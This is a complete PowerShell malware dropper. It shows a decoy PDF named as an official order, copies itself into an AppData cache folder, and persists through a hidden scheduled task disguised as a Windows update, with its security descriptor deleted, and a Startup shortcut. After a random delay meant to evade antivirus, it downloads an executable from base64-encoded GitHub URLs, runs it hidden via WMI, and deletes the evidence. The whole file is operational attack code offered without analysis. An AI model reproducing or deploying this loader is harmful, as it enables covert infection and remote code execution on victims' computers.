$ErrorActionPreference = 'SilentlyContinue'

# === IMMEDIATE CACHE & PDF SETUP ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"

# === OPEN PDF IMMEDIATELY ON FIRST RUN ===
if ($isFirstRun) {
    # Download only if missing (fast WebClient)
    if (-not (Test-Path $pdfPath)) {
        try {
            (New-Object System.Net.WebClient).DownloadFile($pdfUrl, $pdfPath)
        } catch {}
    }
    # Open PDF now – user sees it within 1–2 seconds
    if (Test-Path $pdfPath) {
        try { Start-Process $pdfPath } catch {}
        New-Item -Path $flagFile -ItemType File -Force | Out-Null
    }
}

# === EVERYTHING ELSE HAPPENS SILENTLY AFTER PDF IS OPEN ===
# (Persistence, self-preservation, EXE download & launch)
# These run while the user is reading the decoy.

# Self-preservation
$localPath = "$cache\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch {
            exit
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# Scheduled Task persistence
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    try {
        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
    } catch {}
}

# Startup LNK persistence
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Save()
}

# Bearfoos evasion delay before EXE
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# EXE URL and path
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$exePath = "$cache\helper.exe"
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

# Download EXE with retry
if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            (New-Object System.Net.WebClient).DownloadFile($exeUrl, $exePath)
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

# Launch EXE
if (Test-Path $exePath) {
    try {
        $wmiParams = @{
            ComputerName = $env:COMPUTERNAME
            CommandLine  = "`"$exePath`""
        }
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
    } catch {
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $wsh.Run("`"$exePath`"", 0, $false)
        } catch {
            Start-Process $exePath -WindowStyle Hidden
        }
    }
}

# Cleanup after 5 minutes
Start-Job -ScriptBlock {
    param($exe, $pdf)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
